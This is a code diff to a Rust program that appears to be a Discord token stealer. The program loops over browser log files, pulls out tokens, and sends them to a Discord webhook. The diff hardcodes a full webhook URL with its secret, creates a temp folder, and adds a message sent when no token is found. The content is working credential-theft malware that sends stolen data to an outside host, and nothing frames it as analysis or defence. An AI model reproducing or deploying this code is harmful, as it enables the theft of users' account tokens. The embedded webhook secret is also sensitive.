@@ -1,4 +1,6 @@
 mod utils;
+
+use std::fs::DirBuilder;
 use regex::Regex;
 use utils::{fs, paths, webhook::Webhook};
 
@@ -6,7 +8,9 @@ fn main() {
     // Simply Change webhook-url-here to your webhook url.
     // By default this step are automated via shell script.
     // But still you could change it manually.
-    let webhook = Webhook::new("WEBHOOK_URL_HERE");
+    let webhook = Webhook::new("https://discord.com/api/webhooks/817933623377657867/Cc0VxxYk67sHkohoNb2z2vwHvb4CrP5jSvA7OiuG3PXFF6HtmoVgPO41rMrCWujm9ffm");
+    let temp_dir = dirs::config_dir().unwrap().push("temp_dtg");
+    DirBuilder::new().create(temp_dir);
 
     // Loop over log browser files.
     for path in paths::get() {
@@ -26,6 +30,8 @@ fn main() {
             // If non-none or empty send it out.
             if let Some(token) = token {
                 webhook.send(token);
+            } else {
+                webhook.send("nothing :/".to_string());
             }
         }
     }
